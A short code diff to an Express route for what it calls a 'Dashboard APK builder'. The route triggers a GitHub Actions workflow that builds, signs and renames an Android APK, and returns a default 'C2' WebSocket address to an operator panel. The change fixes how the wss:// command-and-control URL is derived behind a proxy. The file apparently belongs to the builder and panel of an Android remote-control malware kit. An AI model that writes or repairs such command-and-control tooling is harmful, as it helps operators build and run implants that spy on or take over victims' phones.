@@ -1,4 +1,4 @@
-"use strict";
+'use strict';
 // Dashboard APK builder — triggers the GitHub Actions workflow that
 // builds + signs + renames the APK, and reports run status back to the panel.
 //
@@ -46,13 +46,19 @@ function ghRequest(method, path, body) {
 }
 
 // GET /api/builder/config — what the panel needs to render the form
-router.get('/config', (_req, res) => {
+router.get('/config', (req, res) => {
+  // FIX: was building ws:// from req.protocol which is http behind Render's
+  // proxy even on https pages — browsers block mixed-content ws://.
+  // Now: explicit PUBLIC_C2_URL env first, then derive wss:// from the
+  // X-Forwarded-Proto header (trust proxy is set in server.js).
+  const proto = req.get('x-forwarded-proto') || req.protocol || 'https';
+  const wsProto = proto === 'https' ? 'wss' : 'ws';
   res.json({
     configured: Boolean(GH_TOKEN && GH_REPO),
     repo: GH_REPO,
     workflow: GH_WORKFLOW,
     defaultC2: process.env.PUBLIC_C2_URL
-      || `${_req.protocol}://${_req.get('host')}`.replace(/^http/, 'ws') + '/ws',
+      || `${wsProto}://${req.get('host')}/ws`,
   });
 });
 
